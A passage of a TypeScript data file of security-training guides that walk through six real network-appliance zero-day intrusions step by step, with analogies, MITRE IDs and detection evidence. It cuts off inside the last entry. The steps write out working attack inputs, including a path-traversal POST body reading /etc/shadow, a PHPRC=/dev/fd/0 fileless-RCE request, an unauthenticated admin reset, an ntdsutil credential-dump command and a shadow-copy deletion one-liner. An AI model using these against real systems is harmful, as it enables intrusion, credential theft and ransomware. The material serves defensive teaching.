import type { RawScenarioStepGuideData } from '../scenario-step-guides';

export const BATCH7_ZERODAY_APPLIANCES_STEP_GUIDES: Record<string, RawScenarioStepGuideData> = {
  'barracuda-esg-cve-2023-2868-unc4841': {
    scenarioId: 'barracuda-esg-cve-2023-2868-unc4841',
    briefing: {
      headline:
        'UNC4841 exploits a zero-day .tar filename command injection flaw in Barracuda Email Security Gateways (CVE-2023-2868) to deploy SALTWATER, SEASPY, and the SQLite-resident SUBMARINE rootkit.',
      storyAnalogy:
        'Imagine a security guard at the mailroom door who inspects every arriving box by reading the label on the items inside out loud to a voice-activated computer. A spy mails a box where the item’s name tag is written as: "Stop inspecting; unlock the back door and hide a microphone inside the mailroom’s ledger book." Even when the company replaces the guard, the hidden microphone inside the ledger book wakes up every time a new letter is logged.',
      plainSummary:
        'Beginning in October 2022, China-nexus espionage group UNC4841 exploited CVE-2023-2868 by emailing `.tar` archives to Barracuda ESG appliances with backtick shell commands embedded in the archive member filenames. When the Amavis mail scanner passed the filename to a Perl `qx{}` shell block, the commands ran as root, deploying SALTWATER (trojanized `bsmtpd`), SEASPY (`libpcap` backdoor), and SUBMARINE (a persistent SQLite trigger backdoor that prompted CISA and Barracuda to recommend full hardware replacement).',
      diagramTopologySummary:
        'UNC4841 SMTP Sender & C2 Relay -> Barracuda ESG (Amavis .tar Scanner) -> ESG bsmtpd Daemon & SQLite Trigger -> Enterprise Mailboxes & Domain Trusts -> Mandiant / CISA Forensics Sensor.',
      documentedAdvisory:
        'Mandiant UNC4841 Barracuda ESG Investigation / CISA MAR-10454006.r1.v2 (SUBMARINE / SALTWATER) / CVE-2023-2868',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Crafted .tar Attachment Filename Perl qx{} Injection (CVE-2023-2868)',
        storyAnalogy:
          'A spy writes a computer command on the filename sticker inside a zip-style archive knowing the mail scanner types every filename straight into a root terminal.',
        simpleExplanation:
          'UNC4841 sent standard SMTP emails carrying a `.tar` attachment whose internal header filename contained backtick shell metacharacters (`` `echo ... | base64 -d | sh` ``). When the Barracuda ESG `Amavis` content scanner extracted the archive metadata and passed the unsanitized filename into a Perl `qx{}` operator (a Perl construct that spawns `/bin/sh -c` and executes any backtick-enclosed substring before running the outer command), the appliance executed arbitrary shell commands as `root`.',
        howItWorksInPractice:
          'Because the vulnerability triggered during pre-delivery attachment scanning on port 25, exploitation required zero user interaction and succeeded even if the recipient email address did not exist.',
        diagramAlignment:
          'Vector #1.1 links the UNC4841 SMTP Sender to the Barracuda ESG (`Amavis .tar Scanner`) where the `.tar` header triggers root execution.',
        detectionAndEvidence:
          'Amavis mail logs and `/mail/log/barracuda_log` entries showing `.tar` attachment filenames containing backticks (`` ` ``), `$()`, or semicolon command separators.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1574.006',
        plainTitle: 'SALTWATER Trojanized bsmtpd Module & SEASPY PCAP Backdoor',
        storyAnalogy:
          'The intruder swaps the mailroom’s sorting machine with a rigged lookalike and hides a silent listener on the front porch that only wakes up when someone knocks with a secret rhythm.',
        simpleExplanation:
          'With root access, UNC4841 installed `SALTWATER` (a trojanized version of the Barracuda SMTP daemon `/usr/local/barracuda/bin/bsmtpd` that hooks `recv()` and `send()` socket calls to intercept C2 commands disguised as normal SMTP traffic) alongside `SEASPY` (`/sbin/BarracudaMailService`, an ELF backdoor using `libpcap` packet sniffing on `eth0` to watch TCP port 25 for a magic packet trigger without binding its own listening port in `netstat`).',
        howItWorksInPractice:
          'By piggybacking on port 25 via `bsmtpd` hooks and passive `libpcap` filters, UNC4841 bypassed perimeter firewall egress/ingress blocks because port 25 must remain open to the internet on an email gateway.',
        diagramAlignment:
          'Vector #2.1 connects the Barracuda ESG scanner to the ESG `bsmtpd` Daemon & SQLite Trigger node and back to the UNC4841 C2 Relay.',
        detectionAndEvidence:
          'Mandiant/CISA YARA signatures matching `SALTWATER` function hooks in `/usr/local/barracuda/bin/bsmtpd` and `/sbin/BarracudaMailService` opening raw `AF_PACKET` sockets.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1505',
        plainTitle: 'SUBMARINE SQLite Trigger Persistence & Bulk MIME Exfiltration',
        storyAnalogy:
          'Even after the security team sweeps the building, a booby-trap hidden inside the mailroom’s database ledger automatically re-installs the backdoor every time a new email entry is recorded.',
        simpleExplanation:
          'When Barracuda deployed remediation patches, UNC4841 countered with `SUBMARINE` (a multi-component rootkit that hid malicious shell commands inside a `SQLite database trigger` in `/mail/mlog/sql/mlog.sqlite`, causing the root-owned mail logging daemon to automatically re-execute the attacker’s persistence script whenever SQLite processed mail log rows) and staged encrypted `.tar.gz` archives of `/mail/spool/*` to exfiltrate sensitive government and diplomatic emails.',
        howItWorksInPractice:
          'Because `SUBMARINE` entrenched itself across SQLite triggers, `/etc/cron.d`, and kernel modules (`DEPTHCHARGE`), Barracuda and CISA took the unprecedented step of instructing customers to decommission and replace compromised ESG appliances entirely.',
        diagramAlignment:
          'Vector #3.1 traces the ESG `bsmtpd` & SQLite Trigger node harvesting Enterprise Mailboxes & Domain Trusts and streaming encrypted tarballs to the UNC4841 C2 Relay.',
        detectionAndEvidence:
          'CISA MAR-10454006 inspection of `/mail/mlog/sql/mlog.sqlite` for unauthorized `CREATE TRIGGER` statements and anomalous outbound HTTPS transfers from ESG appliances.',
      },
    ],
  },
  'check-point-vpn-cve-2024-24919-info-leak': {
    scenarioId: 'check-point-vpn-cve-2024-24919-info-leak',
    briefing: {
      headline:
        'Threat actors exploit an unauthenticated path traversal zero-day in Check Point Security Gateways (CVE-2024-24919) via /clients/MyCRL to read /etc/shadow and $FWDIR/conf/objects_5_0.C as root, pivoting to dump Active Directory ntds.dit within hours.',
      storyAnalogy:
        'Imagine a public pamphlet window at the front of a fortress where visitors can ask for a specific brochure by name. If a visitor asks for "../../../../MasterKeyBook", the clerk—who happens to carry the king’s master ring—walks out of the pamphlet closet, straight into the royal vault, and hands the Master Key Book through the window.',
      plainSummary:
        'In May 2024, Check Point disclosed CVE-2024-24919 after Mnemonic and watchTowr Labs investigated active zero-day intrusions. On Check Point Security Gateways with Remote Access VPN or Mobile Access enabled, sending a crafted POST request to `/clients/MyCRL` containing `aCSHELL/../../../../../../../etc/shadow` allowed unauthenticated attackers to read any root-accessible file on the appliance, crack local VPN accounts, extract Active Directory LDAP bind credentials from `objects_5_0.C`, and dump `ntds.dit`.',
      diagramTopologySummary:
        'External Threat Actor (POST /clients/MyCRL) -> Check Point Gateway (vpnd root daemon) -> Gateway Filesystem (/etc/shadow & objects_5_0.C) -> Active Directory DC (ntds.dit Extraction) -> watchTowr / Mnemonic MDR Telemetry.',
      documentedAdvisory:
        'Check Point Advisory (CVE-2024-24919) / watchTowr Labs Technical Deep-Dive / Mnemonic Incident Response Report',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Unauthenticated Path Traversal POST Request to /clients/MyCRL (CVE-2024-24919)',
        storyAnalogy:
          'A visitor writes "../" seven times on a brochure request slip, tricking the automated retrieval arm into reaching outside the public folder and into the private safe.',
        simpleExplanation:
          'The attacker sent an unauthenticated HTTP POST request to `/clients/MyCRL` with body `aCSHELL/../../../../../../../etc/shadow`. Inside the Check Point `vpnd` daemon, the `/clients/MyCRL` handler stripped the initial prefix and passed the remaining POST body directly to `fopen()` as `root` (failing to canonicalize the path or strip `../` directory traversal sequences), returning the raw contents of any file on the Gaia OS filesystem in the HTTP 200 response.',
        howItWorksInPractice:
          'watchTowr Labs demonstrated through binary diffing that the patch added an explicit substring check rejecting requests containing `..` or `/` inside the `/clients/MyCRL` handler.',
        diagramAlignment:
          'Vector #1.1 links the External Threat Actor to the Check Point Gateway (`vpnd root daemon`) via `POST /clients/MyCRL`.',
        detectionAndEvidence:
          'Check Point web/VPN logs and IPS signatures alerting on HTTP POST requests to `/clients/MyCRL` or `/clients/MyCRL/` containing `..` sequences.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1552.001',
        plainTitle: 'Harvesting /etc/shadow, SSH Keys & AD LDAP Bind Credentials',
        storyAnalogy:
          'Once the thief realizes the clerk will fetch any book in the building, they ask for the local guard roster, the SSH key ring, and the firewall’s address book containing the corporate directory password.',
        simpleExplanation:
          'Using the arbitrary file-read primitive, the attacker downloaded `/etc/shadow` (containing password hashes for local gateway accounts and legacy password-only VPN test users), `/home/admin/.ssh/id_rsa`, and Check Point’s internal database files `$FWDIR/conf/objects_5_0.C` and `$FWDIR/database/fwauth.NDB` (configuration files that store the Active Directory LDAP integration bind account username and reversible/obfuscated password used by the firewall to query domain groups).',
        howItWorksInPractice:
          'Even if all human employees used MFA for VPN logins, organizations frequently had a forgotten local "test" or vendor VPN user configured with password-only authentication in `fwauth.NDB` or an over-privileged AD LDAP bind account in `objects_5_0.C`.',
        diagramAlignment:
          'Vector #2.1 connects the Check Point Gateway daemon to the Gateway Filesystem (`/etc/shadow & objects_5_0.C`) and returns the secrets to the attacker.',
        detectionAndEvidence:
          'Auditing gateway logs for sequential `/clients/MyCRL` hits followed by VPN login attempts from VPS/TOR IP addresses using local firewall user accounts.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1003.003',
        plainTitle: 'VPN Tunnel Establishment & Active Directory ntds.dit Extraction',
        storyAnalogy:
          'With the local gate key and the over-privileged directory service badge in hand, the thief walks through the VPN tunnel and copies the entire company identity database in under two hours.',
        simpleExplanation:
          'Mnemonic incident responders observed threat actors logging into the Check Point VPN using cracked local credentials and then authenticating to the internal Domain Controller with the stolen `svc_cp_ldap` Active Directory account (which had erroneously been granted Domain Admin or Backup Operators rights), executing `ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\AD"` (the Install From Media feature that creates a Volume Shadow Copy snapshot and extracts `ntds.dit` and the `SYSTEM` registry hive for offline hash cracking).',
        howItWorksInPractice:
          'In documented incidents, the entire kill chain from initial `/clients/MyCRL` file read to full `ntds.dit` Active Directory compromise completed in less than three hours.',
        diagramAlignment:
          'Vector #3.1 traces the attacker’s VPN session through the Check Point Gateway to the Active Directory DC (`ntds.dit Extraction`).',
        detectionAndEvidence:
          'Sysmon EventID 1 on Domain Controllers for `ntdsutil.exe` or `vssadmin.exe` executed under firewall LDAP service accounts (`svc_*`).',
      },
    ],
  },
  'sonicwall-sslvpn-cve-2024-40766-akira': {
    scenarioId: 'sonicwall-sslvpn-cve-2024-40766-akira',
    briefing: {
      headline:
        'Akira and Fog ransomware operators exploit SonicWall SonicOS SSLVPN improper access control (CVE-2024-40766) to establish unauthorized VPN tunnels, pivot via Impacket SMB/WMI, and encrypt Windows and ESXi environments.',
      storyAnalogy:
        'Imagine a building upgrades from an old lock system to a brand-new digital gate, but copies over the old master guest list—and the new digital gate has a wiring bug that lets anyone bypass the guard booth. Ransomware crews slip through the gate, use built-in building intercoms (`WMI`) to walk into every room, smash the backup mirrors, and lock the doors.',
      plainSummary:
        'Disclosed in August 2024 (SNWLID-2024-0015), CVE-2024-40766 is a CVSS 9.3 improper access control flaw in SonicWall SonicOS SSLVPN across Gen 5, Gen 6, and Gen 7 firewalls. Arctic Wolf and Rapid7 tracked rapid weaponization by Akira and Fog ransomware affiliates, who abused the flaw (and unrotated local accounts migrated from Gen 6 to Gen 7) to enter internal networks over port 4433, move laterally via Impacket, delete shadow copies via PowerShell CIM, and deploy `.akira` / `.fog` encryption.',
      diagramTopologySummary:
        'Akira / Fog VPS Infrastructure -> SonicWall Firewall (SonicOS SSLVPN) -> Internal Windows Server (Impacket SMB) -> Hyper-V / ESXi & Domain Shares -> Arctic Wolf / Rapid7 MDR Sensor.',
      documentedAdvisory:
        'SonicWall SNWLID-2024-0015 (CVE-2024-40766) / Arctic Wolf & Rapid7 Akira/Fog Ransomware Campaign Reports / CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'SonicOS SSLVPN Improper Access Control Exploitation (CVE-2024-40766)',
        storyAnalogy:
          'The attacker exploits a flaw in the VPN gate’s access controller that grants a virtual badge and internal IP address without valid authorization.',
        simpleExplanation:
          'Targeting WAN-exposed SonicWall SSLVPN interfaces (commonly on TCP port `4433` or `443`), the attacker exploited `CVE-2024-40766` (an improper access control vulnerability in the SonicOS SSLVPN authentication and session management engine that permits unauthorized resource access and hijacking of local user sessions, particularly when legacy Gen 6 local user password hashes were carried over to Gen 7 appliances without a forced reset).',
        howItWorksInPractice:
          'Once the SSLVPN session established from a commercial VPS IP, the SonicWall appliance assigned an internal virtual IP from the SSLVPN address pool (e.g., `10.212.134.105`), placing the attacker directly on the internal routable network.',
        diagramAlignment:
          'Vector #1.1 links the Akira / Fog VPS Infrastructure to the SonicWall Firewall (`SonicOS SSLVPN`) over TCP port 4433.',
        detectionAndEvidence:
          'SonicOS SSLVPN logs showing sessions established from commercial hosting ASNs (`45.86.201.0/24`, etc.) and logins by local firewall accounts lacking TOTP MFA.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1021.002',
        plainTitle: 'Network Scanning, Impacket SMB Execution & AnyDesk Persistence',
        storyAnalogy:
          'Once inside the hallway, the intruder maps every office door, uses remote management scripts to run commands on servers, and props open a side window (`AnyDesk`) in case the main VPN gate is patched.',
        simpleExplanation:
          'From the allocated SSLVPN IP, the operator ran Active Directory discovery (`nltest /dclist`, `net group "Domain Admins" /domain`), used `Impacket wmiexec.py` (which executes commands remotely via Windows Management Instrumentation `WmiPrvSE.exe` and writes command output to `\\\\127.0.0.1\\ADMIN$\\__<epoch_timestamp>`), and silently installed `AnyDesk` (`msiexec /i AnyDesk.msi /qn`) for persistent remote access independent of the SonicWall VPN.',
        howItWorksInPractice:
          'By deploying AnyDesk or Cloudflared tunnels within minutes of initial SSLVPN entry, Akira and Fog affiliates retained access even after administrators applied the SonicOS firmware patch.',
        diagramAlignment:
          'Vector #2.1 connects the SonicWall Firewall to the Internal Windows Server (`Impacket SMB`) and triggers alerts on the Arctic Wolf / Rapid7 MDR Sensor.',
        detectionAndEvidence:
          'Sysmon EventID 1 showing `WmiPrvSE.exe` spawning `cmd.exe /Q /c ... 1> \\\\127.0.0.1\\ADMIN$\\__*` and unauthorized installation of `AnyDesk.exe`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1490',
        plainTitle: 'PowerShell CIM Shadow Copy Deletion & Akira/Fog Encryption',
        storyAnalogy:
          'After stealing copies of the company’s financial records, the extortionists shatter the emergency recovery snapshots and lock every server and virtual machine.',
        simpleExplanation:
          'After exfiltrating sensitive data with `Rclone` or `WinSCP`, the attacker executed `powershell.exe -Command "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"` (deleting Volume Shadow Copies via the WMI/CIM provider to evade simpler static command-line detections that only watch for `vssadmin.exe delete shadows`) and launched `akira.exe` (which uses a hybrid `ChaCha20 + RSA-4096` cipher to encrypt local drives and network shares with the `.akira` or `.fog` extension).',
        howItWorksInPractice:
          'Akira operators also deployed their Linux/ESXi Rust/C++ encryptor (`akira_esxi`) via SSH onto VMware ESXi hypervisors to encrypt `.vmdk` and `.vswp` virtual machine disks simultaneously.',
        diagramAlignment:
          'Vector #3.1 traces the Internal Windows Server wiping shadow copies and encrypting Hyper-V / ESXi & Domain Shares.',
        detectionAndEvidence:
          'PowerShell ScriptBlock Logging (EventID 4104) capturing `Win32_ShadowCopy | Remove-CimInstance` and high-velocity file renames to `.akira` or `.fog`.',
      },
    ],
  },
  'juniper-junos-jweb-cve-2023-36845-chain': {
    scenarioId: 'juniper-junos-jweb-cve-2023-36845-chain',
    briefing: {
      headline:
        'Attackers exploit CVE-2023-36845 on Juniper SRX firewalls and EX switches by passing PHPRC=/dev/fd/0 in the query string, forcing php-cgi to parse auto_prepend_file=data:// directly from the HTTP POST body for single-request fileless RCE.',
      storyAnalogy:
        'Imagine a restaurant kitchen where a waiter can shout an instruction while handing over a customer’s written menu order. The waiter shouts: "Use the paper in my hand as the new kitchen rulebook!" Written on that paper is a rule saying: "Before cooking any dish, run this secret recipe written in the margin." Because everything happens from the paper in the waiter’s hand, zero files are ever left on the kitchen counter.',
      plainSummary:
        'Initially rated medium-severity and chained with file-upload bug CVE-2023-36844, CVE-2023-36845 was shown by watchTowr Labs and VulnCheck to be a standalone, fileless unauthenticated RCE on Juniper Junos OS J-Web. Because the Embedthis Appweb server copies query parameters into process environment variables before launching `php-cgi`, requesting `/?PHPRC=/dev/fd/0` tells PHP to parse the HTTP POST body (`stdin`) as `php.ini`, where `auto_prepend_file="data://text/plain;base64,..."` executes arbitrary code in memory.',
      diagramTopologySummary:
        'External Exploit Client (PHPRC=/dev/fd/0) -> Juniper SRX / EX (J-Web Appweb CGI) -> FreeBSD php-cgi Process (stdin fd/0) -> Junos Config (/config/juniper.conf.gz) -> watchTowr / VulnCheck IDS Sensor.',
      documentedAdvisory:
        'Juniper SIRT JSA72300 (CVE-2023-36845) / watchTowr Labs & VulnCheck Single-Request Fileless RCE Analysis / CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Appweb CGI Query-String Environment Variable Injection (PHPRC=/dev/fd/0)',
        storyAnalogy:
          'A visitor writes "RULEBOOK=MY_LETTER" on the outside of an envelope, tricking the mail handler into treating the letter inside as the official operating manual.',
        simpleExplanation:
          'The attacker sent an unauthenticated HTTP POST request to `/?PHPRC=/dev/fd/0` on the Juniper J-Web interface. Due to a flaw in how the underlying `Appweb` server constructs the CGI environment table (`CVE-2023-36845`), query-string key-value pairs were injected directly into the child process environment via `setenv()`, setting `PHPRC=/dev/fd/0` (which instructs `/usr/sbin/php-cgi` to read its `php.ini` configuration file from file descriptor 0, i.e., `stdin`, where Appweb pipes the raw HTTP POST request body).',
        howItWorksInPractice:
          'Earlier exploits first uploaded a temporary file via `CVE-2023-36844` and pointed `PHPRC` to `/tmp/php...`, but pointing `PHPRC` to `/dev/fd/0` eliminated the file upload step altogether.',
        diagramAlignment:
          'Vector #1.1 links the External Exploit Client (`PHPRC=/dev/fd/0`) to the Juniper SRX / EX (`J-Web Appweb CGI`) interface.',
        detectionAndEvidence:
          'WAF/IDS detection of `PHPRC` in HTTP query strings, headers, or multipart bodies targeting Juniper J-Web ports.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'Fileless In-Memory PHP Execution via auto_prepend_file=data://',
        storyAnalogy:
          'Reading the attacker’s letter as its new rulebook, the interpreter sees a rule to decode and run a Base64 paragraph in memory before touching any real webpage.',
        simpleExplanation:
          'As `php-cgi` initialized and read `/dev/fd/0` (`stdin`) as its configuration file, it parsed the two lines supplied in the HTTP POST body: `allow_url_include=1` and `auto_prepend_file="data://text/plain;base64,PD9waHAg..."` (a PHP configuration directive that combined with the `data://` stream wrapper decodes and executes arbitrary Base64-encoded PHP code directly in RAM before the target script `/www/index.php` is even loaded, leaving zero artifacts on the filesystem).',
        howItWorksInPractice:
          'Because the payload executes entirely from the `stdin` pipe and `data://` memory stream, forensic investigators checking `/tmp` or `/var/tmp` for dropped webshells find nothing on disk.',
        diagramAlignment:
          'Vector #2.1 connects the Juniper J-Web CGI handler to the FreeBSD `php-cgi` Process (`stdin fd/0`) and alerts the watchTowr / VulnCheck IDS Sensor.',
        detectionAndEvidence:
          'FreeBSD process monitoring showing `/usr/sbin/php-cgi` spawning `/bin/sh` or `/sbin/cli` and HTTP access logs recording `POST /?PHPRC=`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.001',
        plainTitle: 'Junos Configuration Exfiltration (/config/juniper.conf.gz) & Backdoor Admin Creation',
        storyAnalogy:
          'With the router obeying every command, the intruder copies the master network blueprint—including every reversible password—and registers a hidden administrator badge.',
        simpleExplanation:
          'Through the in-memory PHP execution primitive, the attacker read `/config/juniper.conf.gz` (the active Junos configuration archive containing `$9$` reversible-encrypted passwords, SNMP community strings, BGP neighbor keys, and IPSec VPN pre-shared keys) and invoked the Junos `cli` utility to commit a rogue `super-user` login account for persistent SSH/NETCONF access.',
        howItWorksInPractice:
          'Any password stored in `juniper.conf.gz` with the `$9$` prefix (as opposed to `$1$` MD5 or `$6$` SHA-512) can be instantaneously decrypted offline into cleartext using standard Junos `$9$` decoders.',
        diagramAlignment:
          'Vector #3.1 traces the FreeBSD `php-cgi` process reading `/config/juniper.conf.gz` and modifying the Junos Config node.',
        detectionAndEvidence:
          'Junos `UI_COMMIT` syslog events initiated by user `www` and configuration diff alerts for newly added `system login user` entries.',
      },
    ],
  },
  'fortimanager-fgd-jump-cve-2024-47575': {
    scenarioId: 'fortimanager-fgd-jump-cve-2024-47575',
    briefing: {
      headline:
        'UNC5820 exploits a missing authentication zero-day ("FortiJump", CVE-2024-47575) in FortiManager’s fgfmsd daemon (TCP/541) to register a fake FortiGate device, trigger rcs_checkout root command injection, and exfiltrate all managed firewall configs.',
      storyAnalogy:
        'Imagine the central headquarters that manages 500 branch bank vaults. Headquarters has a dedicated phone line (`Port 541`) meant only for branch vaults calling in to sync their combinations. Due to a flaw, headquarters checks that the caller has a laminated ID card, but never checks if the serial number on the card actually belongs to the bank. A thief calls in with a fake serial number, gets patched straight through to the master archive clerk (`rcs_checkout`), and downloads the combinations to all 500 branch vaults.',
      plainSummary:
        'Tracked by Mandiant as UNC5820 beginning in June 2024 and disclosed by Fortinet in October 2024 (FG-IR-24-423), CVE-2024-47575 ("FortiJump", CVSS 9.8) is a missing authentication vulnerability in the FortiGate-to-FortiManager (`fgfmsd`) protocol on TCP port 541. By presenting a self-signed or arbitrary certificate and registering an unknown serial number, an unauthenticated attacker reaches internal API handlers like `rcs_checkout`, injects shell commands as `root`, and steals `/var/fwclient` containing the configurations and password hashes of every managed FortiGate.',
      diagramTopologySummary:
        'UNC5820 Rogue FGFM Client (TCP/541) -> FortiManager Daemon (fgfmsd Port 541) -> FortiManager Root Shell (rcs_checkout) -> Managed FortiGate Fleet Configs & Hashes -> Mandiant / Rapid7 Network Sensor.',
      documentedAdvisory:
        'Fortinet FG-IR-24-423 (CVE-2024-47575) / Mandiant UNC5820 Zero-Day Intrusion Analysis / Rapid7 FortiJump Deep-Dive',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Unauthenticated FGFM TLS Handshake & Rogue Device Registration (TCP/541)',
        storyAnalogy:
          'A stranger walks up to the branch-office check-in window, flashes a self-printed badge with a made-up branch number, and the system automatically registers them as an active branch.',
        simpleExplanation:
          'UNC5820 connected to TCP port `541` on internet-facing FortiManager appliances, completed a mutual TLS handshake using an arbitrary/self-signed certificate, and transmitted an FGFM `request=get` packet with `channel=ip` and a spoofed device serial number (`serial=FGVM02TM...`). Because `fgfmsd` did not verify whether the serial number was pre-authorized before instantiating a device session (`CVE-2024-47575`), the daemon registered the rogue device and opened the authenticated RPC command dispatcher.',
        howItWorksInPractice:
          'FortiManager’s default setting (`fgfm-deny-unknown disable`) allowed unknown FortiGate serial numbers to register dynamically in the `Unregistered Devices` table and immediately invoke internal FGFM protocol channels.',
        diagramAlignment:
          'Vector #1.1 links the UNC5820 Rogue FGFM Client (`TCP/541`) to the FortiManager Daemon (`fgfmsd Port 541`).',
        detectionAndEvidence:
          'FortiManager event logs showing `Unregistered device <serial> added` with `hostname="localhost"` from external WAN IP addresses.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'FGFM put_json / rcs_checkout Command Injection as Root',
        storyAnalogy:
          'Now that the system treats the stranger as a registered branch, the stranger sends a file check-out request with a shell command hidden inside the filename.',
        simpleExplanation:
          'Through the established FGFM session, the attacker sent an `action=put_json` message invoking the internal revision control method `rcs_checkout` (a backend handler in `fgfmsd` that passes the JSON `"file"` parameter directly into `/bin/sh -c "/usr/bin/rcs -l ..."` without shell escaping), executing arbitrary OS commands on the FortiManager appliance with `root` privileges.',
        howItWorksInPractice:
          'Rapid7 and Mandiant documented how `put_json` requests routed through `umath_handler` to `rcs_checkout` allowed immediate non-interactive command execution or interactive reverse shells over TLS.',
        diagramAlignment:
          'Vector #2.1 connects the FortiManager Daemon (`fgfmsd`) to the FortiManager Root Shell (`rcs_checkout`) and triggers the Mandiant / Rapid7 Network Sensor.',
        detectionAndEvidence:
          'Process telemetry on FortiManager showing `/bin/fgfmsd` spawning `/bin/sh -c /usr/bin/rcs -l` with semicolons or backticks, and unexplained files in `/tmp/.tm`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1005',
        plainTitle: 'Exfiltration of Managed FortiGate Configurations (/var/fwclient & globaldb)',
        storyAnalogy:
          'Instead of attacking one firewall, the intruder bags up the central filing cabinet holding the full configuration and passwords for every firewall in the company.',
        simpleExplanation:
          'Running as `root`, UNC5820 compressed `/var/fwclient` and `/var/fds/data` into `/tmp/.tm.tar.gz` and exfiltrated the archive (capturing the complete FortiOS configuration files, IPsec VPN pre-shared keys, network object definitions, and `ENC AK1...` / `PBKDF2` administrator password hashes for every downstream FortiGate firewall managed by the appliance).',
        howItWorksInPractice:
          'With the full running configurations of all managed FortiGate appliances, an adversary can crack weak administrator hashes offline, decrypt Reversible `ENC` secrets using knowledge of FortiOS key derivation, or push malicious firewall policy packages downstream.',
        diagramAlignment:
          'Vector #3.1 traces the FortiManager Root Shell archiving Managed FortiGate Fleet Configs & Hashes and exfiltrating them to UNC5820.',
        detectionAndEvidence:
          'Forensic artifacts in `/tmp/.tm` or `/var/tmp`, unexpected archive creation of `/var/fwclient`, and unauthorized FGFM configuration pushes to downstream FortiGates.',
      },
    ],
  },
  'paloalto-expedition-cve-2024-5910-chain': {
    scenarioId: 'paloalto-expedition-cve-2024-5910-chain',
    briefing: {
      headline:
        'Attackers chain an unauthenticated admin password reset (CVE-2024-5910) with OS command injection (CVE-2024-9463 / CVE-2024-9464) in Palo Alto Networks Expedition to dump stored PAN-OS firewall API keys and multi-vendor configurations.',
      storyAnalogy:
        'Imagine an architect’s office (`Expedition`) hired to translate the blueprints of old bank vaults into brand-new Palo Alto vaults. To do its job, the architect’s desk drawer holds the master keys to both the old and new vaults. A burglar discovers a public button outside the architect’s window labeled "Reset Architect Password to Default," logs in, tricks the blueprint parser into opening a terminal, and empties the desk drawer.',
      plainSummary:
        'Palo Alto Networks Expedition is a migration utility used by network engineers to convert Cisco, Check Point, and Fortinet firewall configurations into PAN-OS format and push them to live firewalls via XML API keys. In 2024, researchers at Horizon3.ai and Unit 42 detailed critical flaws—CVE-2024-5910 (unauthenticated admin reset via `restoreAdmin.php`) and CVE-2024-9463/9464 (OS command injection in `CHECKPOINT.php` and cron handlers)—allowing attackers to compromise Expedition and steal live PAN-OS firewall API keys from its MySQL database.',
      diagramTopologySummary:
        'External Attacker (restoreAdmin.php) -> Palo Alto Expedition Web UI -> Expedition Cron Daemon & MySQL DB -> Managed PAN-OS Firewalls (API Keys) -> Horizon3 / Unit 42 Telemetry.',
      documentedAdvisory:
        'Palo Alto Networks PAN-SA-2024-0006 & PAN-SA-2024-0010 / Horizon3.ai Expedition Technical Analysis / CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Unauthenticated Admin Credential Reset via restoreAdmin.php (CVE-2024-5910)',
        storyAnalogy:
          'A helper script meant only for first-time setup is left unlocked on the front porch, allowing anyone to reset the administrator password back to "paloalto" with a single click.',
        simpleExplanation:
          'The attacker sent an unauthenticated HTTP request to `/OS/startup/restoreAdmin.php` on the Palo Alto Expedition web interface. Because this emergency recovery script lacked any session authentication check (`CVE-2024-5910`), invoking it immediately executed an SQL `UPDATE` query that reset the `admin` account password in the local MySQL database back to its default value (`paloalto`), allowing the attacker to log directly into `/bin/Auth.php`.',
        howItWorksInPractice:
          'In less than two HTTP requests, an unauthenticated remote attacker gained full administrative access to the Expedition web application.',
        diagramAlignment:
          'Vector #1.1 links the External Attacker (`restoreAdmin.php`) to the Palo Alto Expedition Web UI as the admin account is reset and hijacked.',
        detectionAndEvidence:
          'Apache access logs on the Expedition server recording `GET` or `POST` requests to `/OS/startup/restoreAdmin.php`.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'OS Command Injection via Cron/Checkpoint Import Handler (CVE-2024-9463 / CVE-2024-9464)',
        storyAnalogy:
          'Once inside the architect’s dashboard, the intruder feeds a booby-trapped filename into the Check Point blueprint converter, tricking the underlying Linux server into opening a command shell.',
        simpleExplanation:
          'Using the hijacked admin session (or directly via unauthenticated `CVE-2024-9463`), the attacker submitted crafted parameters containing backticks/shell metacharacters to `/bin/configurations/parsers/Checkpoint/CHECKPOINT.php` (where PHP concatenated user-controlled parameters directly into an OS `exec()` call without `escapeshellarg()`, executing arbitrary shell commands as `www-data` and escalating to `root` via Expedition’s scheduled cron job database table).',
        howItWorksInPractice:
          'Because Expedition runs a root-privileged cron script every minute that reads job commands from the local MySQL database (whose credentials `root / paloalto` are hardcoded on the host), `www-data` execution trivially escalates to `root`.',
        diagramAlignment:
          'Vector #2.1 connects the Palo Alto Expedition Web UI to the Expedition Cron Daemon & MySQL DB and triggers the Horizon3 / Unit 42 Telemetry alert.',
        detectionAndEvidence:
          'Linux process monitoring showing `/usr/sbin/apache2` spawning `/bin/sh -c` from `CHECKPOINT.php` or unauthorized entries inserted into the MySQL cron job table.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.001',
        plainTitle: 'Dumping MySQL PAN-OS Firewall API Keys & Multi-Vendor Config Backups',
        storyAnalogy:
          'With control of the database, the intruder extracts the live API keys for the company’s production firewalls and downloads their entire security configurations.',
        simpleExplanation:
          'The attacker dumped the `pandb.devices` MySQL table and extracted the stored encryption key from the Expedition codebase to decrypt the saved `PAN-OS XML API keys` (`LUFRPT1...`, long-lived administrative bearer tokens used by Expedition to push policies to live Panorama and PA-Series firewalls) alongside imported Cisco ASA, Fortinet, and Check Point configuration backups.',
